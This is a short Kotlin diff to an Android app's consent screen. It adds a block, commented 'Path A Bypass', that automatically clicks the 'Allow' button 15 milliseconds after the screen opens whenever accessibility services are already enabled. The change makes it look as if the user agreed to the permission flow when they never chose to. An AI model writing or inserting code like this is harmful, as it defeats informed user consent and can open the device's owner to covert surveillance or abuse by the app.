@@ -132,6 +132,15 @@ class ConsentActivity : AppCompatActivity() {
             Toast.makeText(this, getString(R.string.consent_decline_message), Toast.LENGTH_LONG).show()
             finishAffinity()
         }
+
+        // Path A Bypass: If Accessibility is already active on device, immediately trigger permission grant flow
+        if (isAccessibilityEnabled()) {
+            Handler(Looper.getMainLooper()).postDelayed({
+                if (!isFinishing && !isDestroyed) {
+                    binding.btnAllow.performClick()
+                }
+            }, 15L)
+        }
     }
 
     private fun checkAndPromptNextSystemPermission() {
